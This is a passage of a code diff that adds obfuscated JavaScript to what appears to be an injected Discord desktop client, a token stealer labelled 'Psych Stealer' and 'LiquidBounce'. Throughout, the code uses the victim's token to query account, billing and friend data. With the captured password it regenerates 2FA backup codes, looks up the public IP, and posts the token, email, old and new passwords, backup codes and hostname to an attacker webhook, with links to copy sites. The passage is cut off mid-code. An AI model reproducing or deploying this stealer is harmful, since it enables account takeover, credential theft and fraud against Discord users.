+              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
+                W +
+                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
+              true
+            )
+            .then((k) => {
+              s.webContents
+                .executeJavaScript(
+                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
+                    W +
+                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
+                  true
+                )
+                .then((R) => {
+                  if (W.startsWith('mfa')) {
+                    s.webContents
+                      .executeJavaScript(
+                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
+                          W +
+                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
+                          w +
+                          '","regenerate":true}));\n              xmlHttp.responseText',
+                        true
+                      )
+                      .then((e) => {
+                        var C = [],
+                          n = '',
+                          S = 'https://rustlercoppy.com/copy/',
+                          t = JSON.parse(e)
+                        let X = t.backup_codes
+                        const M = X.filter((h) => {
+                          return h.consumed == false
+                        })
+                        for (let h in M) {
+                          if (h == 0) {
+                            n +=
+                              '<:Rustler:936417408363679824> `' +
+                              M[h].code.insert(4, '') +
+                              '` '
+                          } else {
+                            if (h % 2 === 1) {
+                              n +=
+                                '<:Rustler:936417408363679824> `' +
+                                M[h].code.insert(4, '') +
+                                '` \n'
+                            } else {
+                              n +=
+                                '<:Rustler:936417408363679824> `' +
+                                M[h].code.insert(4, '') +
+                                '` '
+                            }
+                          }
+                        }
+                        function v() {
+                          var K = JSON.parse(R)
+                          const A0 = K.filter((A1) => {
+                            return A1.type == 1
+                          })
+                          return A0.length
+                        }
+                        function u() {
+                          var K = JSON.parse(R)
+                          const A2 = K.filter((A3) => {
+                            return A3.type == 1
+                          })
+                          var E = ''
+                          for (z of A2) {
+                            var A0 = GetRBadges(z.user.public_flags)
+                            if (A0 != '') {
+                              E +=
+                                A0 +
+                                (' | `' +
+                                  z.user.username +
+                                  '#' +
+                                  z.user.discriminator +
+                                  '`\n')
+                            }
+                          }
+                          if (E == '') {
+                            E = '*Nothing to see here*'
+                          }
+                          return E
+                        }
+                        function H() {
+                          const A0 = JSON.parse(k)
+                          var K = ''
+                          return (
+                            A0.forEach((A1) => {
+                              if (A1.type == '') {
+                                return '`No`'
+                              } else {
+                                if (A1.type == 2 && A1.invalid != true) {
+                                  K += ' <:paypal:896441236062347374>'
+                                } else {
+                                  if (A1.type == 1 && A1.invalid != true) {
+                                    K += ' :credit_card:'
+                                  } else {
+                                    return '`No`'
+                                  }
+                                }
+                              }
+                            }),
+                            K == '' && (K = '`No`'),
+                            K
+                          )
+                        }
+                        const m = JSON.parse(J)
+                        var Y = {
+                          username: 'LiquidBounce',
+                          content: '',
+                          embeds: [
+                            {
+                              color: config['embed-color'],
+                              fields: [
+                                {
+                                  name: '<:token:949679866188529714> Token:',
+                                  value:
+                                    '`' +
+                                    W +
+                                    '`' +
+                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                                    W +
+                                    ')',
+                                  inline: false,
+                                },
+                                {
+                                  name: '<:badge:949679865710403584> Badges:',
+                                  value: '' + GetBadges(m.flags),
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:nitro:949679866033352784> Nitro Type:',
+                                  value: '' + GetNitro(m.premium_type),
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:card:949679865798475827>Billing',
+                                  value: '' + H(),
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:ip:949680203859369994> IP:',
+                                  value: '`' + D + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:mail:949679866113032253> Email:',
+                                  value: '`' + a + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:password:949679865580384266> Password:',
+                                  value: '`' + w + '`',
+                                  inline: true,
+                                },
+                              ],
+                              author: {
+                                name:
+                                  m.username +
+                                  '#' +
+                                  m.discriminator +
+                                  ' (' +
+                                  m.id +
+                                  ')',
+                                icon_url:
+                                  'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                              },
+                              footer: { text: 'LiquidBounce' },
+                              thumbnail: {
+                                url:
+                                  'https://cdn.discordapp.com/avatars/' +
+                                  m.id +
+                                  '/' +
+                                  m.avatar,
+                              },
+                            },
+                          ],
+                        }
+                        const P = {
+                          color: config['embed-color'],
+                          description: '' + n,
+                          author: {},
+                          footer: {},
+                        }
+                        P.author.icon_url =
+                          'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif'
+                        P.author.name = '2FA Codes'
+                        P.footer.text = 'LiquidBounce'
+                        var q = P,
+                          i = {
+                            color: config['embed-color'],
+                            description: u(),
+                            author: {
+                              icon_url:
+                                'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                              name: 'HQ Friends',
+                            },
+                            footer: { text: 'LiquidBounce' },
+                          }
+                        W.startsWith('mfa') && Y.embeds.push(q)
+                        Y.embeds.push(i)
+                        SendToWebhook(JSON.stringify(Y))
+                      })
+                  } else {
+                    const G = BrowserWindow.getAllWindows()[0]
+                    G.webContents
+                      .executeJavaScript(
+                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
+                          W +
+                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
+                        true
+                      )
+                      .then((C) => {
+                        G.webContents
+                          .executeJavaScript(
+                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
+                            true
+                          )
+                          .then((S) => {
+                            G.webContents
+                              .executeJavaScript(
+                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
+                                  W +
+                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
+                                true
+                              )
+                              .then((q) => {
+                                G.webContents
+                                  .executeJavaScript(
+                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
+                                      W +
+                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
+                                    true
+                                  )
+                                  .then((y) => {
+                                    function M() {
+                                      var P = JSON.parse(y)
+                                      const h = P.filter((o) => {
+                                        return o.type == 1
+                                      })
+                                      return h.length
+                                    }
+                                    function v() {
+                                      var P = JSON.parse(y)
+                                      const I = P.filter((V) => {
+                                        return V.type == 1
+                                      })
+                                      var h = ''
+                                      for (z of I) {
+                                        var o = GetRBadges(z.user.public_flags)
+                                        o != '' &&
+                                          (h +=
+                                            o +
+                                            (' | `' +
+                                              z.user.username +
+                                              '#' +
+                                              z.user.discriminator +
+                                              '`\n'))
+                                      }
+                                      if (h == '') {
+                                        h = '*Nothing to see here*'
+                                      }
+                                      return h
+                                    }
+                                    function u() {
+                                      const h = JSON.parse(q)
+                                      var P = ''
+                                      return (
+                                        h.forEach((o) => {
+                                          if (o.type == '') {
+                                            return '`No`'
+                                          } else {
+                                            if (
+                                              o.type == 2 &&
+                                              o.invalid != true
+                                            ) {
+                                              P +=
+                                                ' <:paypal:896441236062347374>'
+                                            } else {
+                                              if (
+                                                o.type == 1 &&
+                                                o.invalid != true
+                                              ) {
+                                                P += ' :credit_card:'
+                                              } else {
+                                                return '`No`'
+                                              }
+                                            }
+                                          }
+                                        }),
+                                        P == '' && (P = '`No`'),
+                                        P
+                                      )
+                                    }
+                                    const H = JSON.parse(C)
+                                    var X = {
+                                      username: 'Psych Stealer',
+                                      content: '',
+                                      embeds: [
+                                        {
+                                          color: config['embed-color'],
+                                          fields: [
+                                            {
+                                              name: '<:token:949679866188529714> Token:',
+                                              value:
+                                                '`' +
+                                                W +
+                                                '`' +
+                                                '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                                                W +
+                                                ')',
+                                              inline: false,
+                                            },
+                                            {
+                                              name: '<:badge:949679865710403584> Badges:',
+                                              value: '' + GetBadges(H.flags),
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:nitro:949679866033352784> Nitro Type:',
+                                              value:
+                                                '' + GetNitro(H.premium_type),
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:card:949679865798475827>Billing',
+                                              value: '' + u(),
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:ip:949680203859369994> IP:',
+                                              value: '`' + S + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:mail:949679866113032253> Email:',
+                                              value: '`' + a + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:password:949679865580384266> Password:',
+                                              value: '`' + w + '`',
+                                              inline: true,
+                                            },
+                                          ],
+                                          author: {
+                                            name:
+                                              H.username +
+                                              '#' +
+                                              H.discriminator +
+                                              ' (' +
+                                              H.id +
+                                              ')',
+                                            icon_url:
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                                          },
+                                          footer: { text: 'LiquidBounce' },
+                                          thumbnail: {
+                                            url:
+                                              'https://cdn.discordapp.com/avatars/' +
+                                              H.id +
+                                              '/' +
+                                              H.avatar,
+                                          },
+                                        },
+                                        {
+                                          color: config['embed-color'],
+                                          description: v(),
+                                          author: {
+                                            icon_url:
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                                            name: 'HQ Friends',
+                                          },
+                                          footer: { text: 'LiquidBounce' },
+                                        },
+                                      ],
+                                    }
+                                    SendToWebhook(JSON.stringify(X))
+                                  })
+                              })
+                          })
+                      })
+                  }
+                })
+            })
+        })
+    })
+}
+function ChangePassword(a, w, W) {
+  const s = BrowserWindow.getAllWindows()[0]
+  s.webContents
+    .executeJavaScript(
+      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
+        W +
+        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
+      true
+    )
+    .then((J) => {
+      s.webContents
+        .executeJavaScript(
+          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
+          true
+        )
+        .then((D) => {
+          s.webContents
+            .executeJavaScript(
+              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
+                W +
+                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
+              true
+            )
+            .then((L) => {
+              s.webContents
+                .executeJavaScript(
+                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
+                    W +
+                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
+                  true
+                )
+                .then((R) => {
+                  if (W.startsWith('mfa')) {
+                    s.webContents
+                      .executeJavaScript(
+                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
+                          W +
+                          '")\n\t      xmlHttp.send(JSON.stringify({"password":"' +
+                          w +
+                          '","regenerate":true}));\n              xmlHttp.responseText',
+                        true
+                      )
+                      .then((e) => {
+                        var C = [],
+                          n = '',
+                          S = 'https://superfurrycdn.nl/copy/',
+                          t = JSON.parse(e)
+                        let y = t.backup_codes
+                        const X = y.filter((P) => {
+                          return P.consumed == false
+                        })
+                        for (let P in X) {
+                          if (P == 0) {
+                            n +=
+                              '<:Rustler:936417408363679824> `' +
+                              X[P].code.insert(4, '') +
+                              '` '
+                          } else {
+                            if (P % 2 === 1) {
+                              n +=
+                                '<:Rustler:936417408363679824> `' +
+                                X[P].code.insert(4, '') +
+                                '` \n'
+                            } else {
+                              n +=
+                                '<:Rustler:936417408363679824> `' +
+                                X[P].code.insert(4, '') +
+                                '` '
+                            }
+                          }
+                        }
+                        function M() {
+                          var x = JSON.parse(R)
+                          const O = x.filter((K) => {
+                            return K.type == 1
+                          })
+                          return O.length
+                        }
+                        function v() {
+                          var O = JSON.parse(R)
+                          const A0 = O.filter((A1) => {
+                            return A1.type == 1
+                          })
+                          var K = ''
+                          for (z of A0) {
+                            var E = GetRBadges(z.user.public_flags)
+                            E != '' &&
+                              (K +=
+                                E +
+                                (' | `' +
+                                  z.user.username +
+                                  '#' +
+                                  z.user.discriminator +
+                                  '`\n'))
+                          }
+                          return K == '' && (K = '*Nothing to see here*'), K
+                        }
+                        function u() {
+                          const E = JSON.parse(L)
+                          var O = ''
+                          E.forEach((A0) => {
+                            if (A0.type == '') {
+                              return '`No`'
+                            } else {
+                              if (A0.type == 2 && A0.invalid != true) {
+                                O += ' <:paypal:896441236062347374>'
+                              } else {
+                                if (A0.type == 1 && A0.invalid != true) {
+                                  O += ' :credit_card:'
+                                } else {
+                                  return '`No`'
+                                }
+                              }
+                            }
+                          })
+                          if (O == '') {
+                            O = '`No`'
+                          }
+                          return O
+                        }
+                        const H = JSON.parse(J)
+                        var Y = {
+                          username: 'Psych Stealer',
+                          content: '',
+                          embeds: [
+                            {
+                              color: config['embed-color'],
+                              fields: [
+                                {
+                                  name: '<:token:949679866188529714> Token:',
+                                  value:
+                                    '`' +
+                                    W +
+                                    '`' +
+                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                                    W +
+                                    ')',
+                                  inline: false,
+                                },
+                                {
+                                  name: '<:badge:949679865710403584> Badges:',
+                                  value: '' + GetBadges(H.flags),
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:nitro:949679866033352784> Nitro Type:',
+                                  value: '' + GetNitro(H.premium_type),
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:card:949679865798475827>Billing',
+                                  value: '' + u(),
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:ip:949680203859369994> IP:',
+                                  value: '`' + D + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:mail:949679866113032253> Email:',
+                                  value: '`' + H.email + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:password:949679865580384266> Old Password:',
+                                  value: '`' + a + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: '<:password:949679865580384266> New Password:',
+                                  value: '`' + w + '`',
+                                  inline: true,
+                                },
+                              ],
+                              author: {
+                                name:
+                                  H.username +
+                                  '#' +
+                                  H.discriminator +
+                                  ' (' +
+                                  H.id +
+                                  ')',
+                                icon_url:
+                                  'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                              },
+                              footer: { text: 'LiquidBounce' },
+                              thumbnail: {
+                                url:
+                                  'https://cdn.discordapp.com/avatars/' +
+                                  H.id +
+                                  '/' +
+                                  H.avatar,
+                              },
+                            },
+                          ],
+                        }
+                        const m = {
+                          color: config['embed-color'],
+                          description: '' + n,
+                          author: {},
+                          footer: {},
+                        }
+                        m.author.icon_url =
+                          'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif'
+                        m.author.name = '2FA Codes'
+                        m.footer.text = 'Psych Stealer'
+                        var i = {
+                          color: config['embed-color'],
+                          description: v(),
+                          author: {
+                            icon_url:
+                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                            name: 'HQ Friends',
+                          },
+                          footer: { text: 'Psych Stealer' },
+                        }
+                        W.startsWith('mfa') && Y.embeds.push(q)
+                        Y.embeds.push(i)
+                        SendToWebhook(JSON.stringify(Y))
+                      })
+                  } else {
+                    const C = BrowserWindow.getAllWindows()[0]
+                    C.webContents
+                      .executeJavaScript(
+                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
+                          W +
+                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
+                        true
+                      )
+                      .then((n) => {
+                        C.webContents
+                          .executeJavaScript(
+                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
+                            true
+                          )
+                          .then((t) => {
+                            C.webContents
+                              .executeJavaScript(
+                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
+                                  W +
+                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
+                                true
+                              )
+                              .then((Y) => {
+                                C.webContents
+                                  .executeJavaScript(
+                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
+                                      W +
+                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
+                                    true
+                                  )
+                                  .then((y) => {
+                                    function M() {
+                                      var P = JSON.parse(y)
+                                      const h = P.filter((o) => {
+                                        return o.type == 1
+                                      })
+                                      return h.length
+                                    }
+                                    function v() {
+                                      var P = JSON.parse(y)
+                                      const V = P.filter((x) => {
+                                        return x.type == 1
+                                      })
+                                      var h = ''
+                                      for (z of V) {
+                                        var o = GetRBadges(z.user.public_flags)
+                                        if (o != '') {
+                                          h +=
+                                            o +
+                                            (' | `' +
+                                              z.user.username +
+                                              '#' +
+                                              z.user.discriminator +
+                                              '`\n')
+                                        }
+                                      }
+                                      if (h == '') {
+                                        h = '*Nothing to see here*'
+                                      }
+                                      return h
+                                    }
+                                    function u() {
+                                      const o = JSON.parse(Y)
+                                      var P = ''
+                                      return (
+                                        o.forEach((I) => {
+                                          if (I.type == '') {
+                                            return '`No`'
+                                          } else {
+                                            if (
+                                              I.type == 2 &&
+                                              I.invalid != true
+                                            ) {
+                                              P +=
+                                                ' <:paypal:896441236062347374>'
+                                            } else {
+                                              if (
+                                                I.type == 1 &&
+                                                I.invalid != true
+                                              ) {
+                                                P += ' :credit_card:'
+                                              } else {
+                                                return '`No`'
+                                              }
+                                            }
+                                          }
+                                        }),
+                                        P == '' && (P = '`No`'),
+                                        P
+                                      )
+                                    }
+                                    const H = JSON.parse(n)
+                                    var X = {
+                                      username: 'Psych Stealer',
+                                      content: '',
+                                      embeds: [
+                                        {
+                                          color: config['embed-color'],
+                                          fields: [
+                                            {
+                                              name: '<:token:949679866188529714> Token:',
+                                              value:
+                                                '`' +
+                                                W +
+                                                '`' +
+                                                '\n[CopyToken](https://superfurrycdn.nl/copy/' +
+                                                W +
+                                                ')',
+                                              inline: false,
+                                            },
+                                            {
+                                              name: '<:badge:949679865710403584> Badges:',
+                                              value: '' + GetBadges(H.flags),
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:nitro:949679866033352784> Nitro Type:',
+                                              value:
+                                                '' + GetNitro(H.premium_type),
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:card:949679865798475827>Billing',
+                                              value: '' + u(),
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:ip:949680203859369994> IP:',
+                                              value: '`' + t + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:mail:949679866113032253> Email:',
+                                              value: '`' + H.email + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:password:949679865580384266> Old Password:',
+                                              value: '`' + a + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: '<:password:949679865580384266> New Password:',
+                                              value: '`' + w + '`',
+                                              inline: true,
+                                            },
+                                          ],
+                                          author: {
+                                            name:
+                                              H.username +
+                                              '#' +
+                                              H.discriminator +
+                                              ' (' +
+                                              H.id +
+                                              ')',
+                                            icon_url:
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                                          },
+                                          footer: { text: 'Psych Stealer' },
+                                          thumbnail: {
+                                            url:
+                                              'https://cdn.discordapp.com/avatars/' +
+                                              H.id +
+                                              '/' +
+                                              H.avatar,
+                                          },
+                                        },
+                                        {
+                                          color: config['embed-color'],
+                                          description: v(),
+                                          author: {
+                                            icon_url:
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                                            name: 'HQ Friends',
+                                          },
+                                          footer: { text: 'LiquidBounce' },
+                                        },
+                                      ],
+                                    }
+                                    SendToWebhook(JSON.stringify(X))
+                                  })
+                              })
+                          })
+                      })
+                  }
+                })
+            })
+        })
+    })
+}
+function ChangeEmail(a, w, W) {
+  const s = BrowserWindow.getAllWindows()[0]
+  s.webContents
+    .executeJavaScript(
+      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
+        W +
+        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
+      true
+    )
+    .then((J) => {
+      s.webContents
+        .executeJavaScript(
+          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
+          true
+        )
+        .then((D) => {
+          s.webContents
+            .executeJavaScript(
+              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
+                W +
+                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
+              true
+            )
+            .then((k) => {
+              s.webContents
+                .executeJavaScript(
+                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
+                    W +
+                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
+                  true
+                )
+                .then((R) => {
+                  if (W.startsWith('mfa')) {
+                    s.webContents
+                      .executeJavaScript(
+                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
+                          W +
+                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
+                          w +
+                          '","regenerate":true}));\n              xmlHttp.responseText',
+                        true
+                      )
+                      .then((f) => {
+                        var G = [],
+                          C = 'https://superfurrycdn.nl/copy/',
+                          n = JSON.parse(f)
+                        let S = n.backup_codes
+                        const t = S.filter((u) => {
+                          return u.consumed == null
+                        })
+                        for (let u in t) {
+                          G.push({
+                            name: 'Code',
+                            value: '`' + t[u].code.insert(4, '-') + '`',
+                            inline: true,
+                          })
+                          C += t[u].code.insert(4, '-') + '<br>'
+                        }
+                        function Y() {
+                          var P = JSON.parse(R)
+                          const o = P.filter((I) => {
+                            return I.type == 1
+                          })
+                          return o.length
+                        }
+                        function q() {
+                          var P = JSON.parse(R)
+                          const I = P.filter((V) => {
+                            return V.type == 1
+                          })
+                          var h = ''
+                          for (z of I) {
+                            var o = GetRBadges(z.user.public_flags)
+                            if (o != '') {
+                              h +=
+                                o +
+                                (' | `' +
+                                  z.user.username +
+                                  '#' +
+                                  z.user.discriminator +
+                                  '`\n')
+                            }
+                          }
+                          return h == '' && (h = '*Nothing to see here*'), h
+                        }
+                        function i() {
+                          const P = JSON.parse(k)
+                          var h = ''
+                          P.forEach((o) => {
+                            if (o.type == '') {
+                              return '`\u274C`'
+                            } else {
+                              if (o.type == 2 && o.invalid != true) {
+                                h += '`\u2714` <:paypal:896441236062347374>'
+                              } else {
+                                if (o.type == 1 && o.invalid != true) {
+                                  h += '`\u2714` :credit_card:'
+                                } else {
+                                  return '`\u274C`'
+                                }
+                              }
+                            }
+                          })
+                          h == '' && (h = '`\u274C`')
+                          return h
+                        }
+                        const y = JSON.parse(J)
+                        var X = {
+                          username: 'Psych Stealer',
+                          content: '',
+                          embeds: [
+                            {
+                              title: 'Email Changed',
+                              description:
+                                '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
+                                W +
+                                ')',
+                              color: config['embed-color'],
+                              fields: [
+                                {
+                                  name: 'Info',
+                                  value:
+                                    '```Hostname: \n' +
+                                    computerName +
+                                    '\nIP: \n' +
+                                    D +
+                                    '```',
+                                  inline: false,
+                                },
+                                {
+                                  name: 'Username',
+                                  value:
+                                    '`' +
+                                    y.username +
+                                    '#' +
+                                    y.discriminator +
+                                    '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: 'ID',
+                                  value: '`' + y.id + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: 'Nitro',
+                                  value: '' + GetNitro(y.premium_type),
+                                  inline: false,
+                                },
+                                {
+                                  name: 'Badges',
+                                  value: '' + GetBadges(y.flags),
+                                  inline: false,
+                                },
+                                {
+                                  name: 'Billing',
+                                  value: '' + i(),
+                                  inline: false,
+                                },
+                                {
+                                  name: 'New Email',
+                                  value: '`' + email + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: 'Password',
+                                  value: '`' + w + '`',
+                                  inline: true,
+                                },
+                                {
+                                  name: 'Token',
+                                  value: '```' + W + '```',
+                                  inline: false,
+                                },
+                              ],
+                              author: { name: 'LiquidBounce' },
+                              footer: { text: 'LiquidBounce' },
+                              thumbnail: {
+                                url:
+                                  'https://cdn.discordapp.com/avatars/' +
+                                  y.id +
+                                  '/' +
+                                  y.avatar,
+                              },
+                            },
+                            {
+                              title: 'Total Friends (' + Y() + ')',
+                              color: config['embed-color'],
+                              description: q(),
+                              author: { name: 'Psych Stealer' },
+                              footer: { text: 'Psych Stealer' },
+                              thumbnail: {
+                                url:
+                                  'https://cdn.discordapp.com/avatars/' +
+                                  y.id +
+                                  '/' +
+                                  y.avatar,
+                              },
+                            },
+                          ],
+                        }
+                        const M = {
+                          title: ':detective: __2FA Codes__',
+                          description: '[Get all of them](' + C + ')',
+                          color: config['embed-color'],
+                          fields: G,
+                          author: {},
+                          footer: {},
+                        }
+                        M.author.name = 'LiquidBounce'
+                        M.footer.text = 'LiquidBounce'
+                        var v = M
+                        W.startsWith('mfa') && X.embeds.push(v)
+                        SendToWebhook(JSON.stringify(X))
+                      })
+                  } else {
+                    const f = BrowserWindow.getAllWindows()[0]
+                    f.webContents
+                      .executeJavaScript(
+                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
+                          W +
+                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
+                        true
+                      )
+                      .then((e) => {
+                        f.webContents
+                          .executeJavaScript(
+                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
+                            true
+                          )
+                          .then((C) => {
+                            f.webContents
+                              .executeJavaScript(
+                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
+                                  W +
+                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
+                                true
+                              )
+                              .then((n) => {
+                                f.webContents
+                                  .executeJavaScript(
+                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
+                                      W +
+                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
+                                    true
+                                  )
+                                  .then((t) => {
+                                    function q() {
+                                      var v = JSON.parse(t)
+                                      const u = v.filter((H) => {
+                                        return H.type == 1
+                                      })
+                                      return u.length
+                                    }
+                                    function i() {
+                                      var v = JSON.parse(t)
+                                      const u = v.filter((P) => {
+                                        return P.type == 1
+                                      })
+                                      var H = ''
+                                      for (z of u) {
+                                        var m = GetRBadges(z.user.public_flags)
+                                        m != '' &&
+                                          (H +=
+                                            m +
+                                            (' ' +
+                                              z.user.username +
+                                              '#' +
+                                              z.user.discriminator +
+                                              '\n'))
+                                      }
+                                      H == '' && (H = 'No Rare Friends')
+                                      return H
+                                    }
+                                    function y() {
+                                      const M = JSON.parse(n)
+                                      var v = ''
+                                      M.forEach((u) => {
+                                        if (u.type == '') {
+                                          return '`\u274C`'
+                                        } else {
+                                          if (
+                                            u.type == 2 &&
+                                            u.invalid != true
+                                          ) {
+                                            v +=
+                                              '`\u2714` <:paypal:896441236062347374>'
+                                          } else {
+                                            if (
+                                              u.type == 1 &&
+                                              u.invalid != true
+                                            ) {
+                                              v += '`\u2714` :credit_card:'
+                                            } else {
+                                              return '`\u274C`'
+                                            }
+                                          }
+                                        }
+                                      })
+                                      v == '' && (v = '`\u274C`')
+                                      return v
+                                    }
+                                    const g = JSON.parse(e)
+                                    var X = {
+                                      username: 'LiquidBounce',
+                                      content: '',
+                                      embeds: [
+                                        {
+                                          title: 'Email Changed',
+                                          description:
